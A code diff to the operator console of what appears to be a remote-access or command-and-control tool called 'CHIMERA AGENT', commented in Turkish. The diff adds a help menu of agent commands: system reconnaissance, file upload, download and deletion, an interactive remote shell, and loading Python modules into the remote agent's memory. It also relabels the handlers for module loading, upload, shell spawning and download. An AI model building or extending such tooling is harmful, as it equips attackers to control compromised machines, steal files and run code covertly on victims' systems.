@@ -256,8 +256,45 @@ class Handler(BaseHandler):
                     # Arka plana at (Session açık kalır)
                     print(f"[*] Session {self.session_id} arka plana atıldı.")
                     break
+                
+                # Yardım komutu
+                if cmd_lower in ["help", "?"]:
+                    help_text = """
+╔════════════════════════════════════════════════════════════════╗
+║              CHIMERA AGENT - KULLANILABILIR KOMUTLAR           ║
+╚════════════════════════════════════════════════════════════════╝
 
-                # Özellik 2.1: Modül Yükleme (Local File -> Remote Memory)
+[Oturum Yönetimi]
+  background, bg        - Oturumu arka plana at
+  exit, quit            - Ajanı sonlandır ve bağlantıyı kes
+
+[Sistem Bilgisi]
+  sysinfo               - Detaylı sistem bilgisi (OS, IP, process, yetki)
+  pwd                   - Mevcut dizini göster
+  
+[Dosya İşlemleri]
+  ls [path]             - Dizin içeriğini listele
+  cd <path>             - Dizin değiştir
+  mkdir <path>          - Klasör oluştur
+  rm <path>             - Dosya/klasör sil
+  upload <local> [remote] - Dosya yükle
+  download <remote>     - Dosya indir
+
+[Komut Çalıştırma]
+  shell                 - İnteraktif shell başlat
+  <komut>               - Sistem komutu çalıştır (örn: whoami, ipconfig)
+
+[Modül Yönetimi]
+  loadmodule <file>     - Python modülünü hafızaya yükle
+  runmodule <name> [func] - Yüklü modülü çalıştır
+  listmodules           - Yüklü modülleri listele
+
+═══════════════════════════════════════════════════════════════════
+"""
+                    print(help_text)
+                    continue
+
+                # Modül Yükleme: Yerel Python dosyasını uzak ajanın belleğine yükle
                 if cmd_lower.startswith("loadmodule "):
                     try:
                         parts = cmd.split(" ", 1)
@@ -287,7 +324,7 @@ class Handler(BaseHandler):
                         print(f"[!] Modül hazırlama hatası: {str(e)}")
                         continue
 
-                # Özellik 3.1: Dosya Upload (Local -> Remote)
+                # Dosya Yükleme: Yerel dosyayı uzak sisteme transfer et
                 if cmd_lower.startswith("upload "):
                     try:
                         parts = cmd.split(" ", 2)
@@ -316,7 +353,7 @@ class Handler(BaseHandler):
                 # Komutu gönder
                 self.send_data(cmd)
 
-                # Özellik 2.3: Shell Spawning
+                # Shell Modu: İnteraktif shell oturumu başlat
                 if cmd_lower == "shell":
                     # Önce "Shell başlatıldı" mesajını bekle
                     response = self.recv_data()
@@ -332,7 +369,7 @@ class Handler(BaseHandler):
                 # Normal komut cevabı bekle
                 response = self.recv_data()
                 if response:
-                    # Özellik 3.1: Download Cevabı Kontrolü
+                    # Dosya İndirme: İndirilen dosyayı yerel sisteme kaydet
                     if response.startswith("DOWNLOAD_OK:"):
                         try:
                             # Format: DOWNLOAD_OK:<base64>
